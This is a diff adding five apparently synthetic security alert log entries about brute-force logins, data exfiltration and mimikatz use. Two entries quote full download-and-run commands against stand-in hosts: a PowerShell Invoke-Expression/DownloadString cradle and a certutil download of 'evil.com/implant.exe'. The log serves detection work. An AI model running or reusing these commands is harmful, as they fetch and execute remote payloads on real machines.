@@ -1,0 +1,5 @@
+2024-03-15 08:23:41 WARNING: PowerShell execution detected from user jdoe on HOST-PC01. Command: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')
+2024-03-15 09:14:02 ALERT: Multiple failed login attempts for user admin from IP 192.168.1.105 - 47 attempts in 5 minutes
+2024-03-15 10:05:33 CRITICAL: Suspicious outbound data transfer detected - 2.3GB sent to external IP 45.33.32.156 from HOST-WS07
+2024-03-15 11:32:17 WARNING: Scheduled task created by non-admin user: svc_backup on DC01 - Task: "SystemUpdate" running cmd.exe /c certutil -urlcache -split -f http://evil.com/implant.exe
+2024-03-15 12:45:09 ALERT: Credential dumping tool detected - mimikatz.exe executed on HOST-PC03 by user tsmith
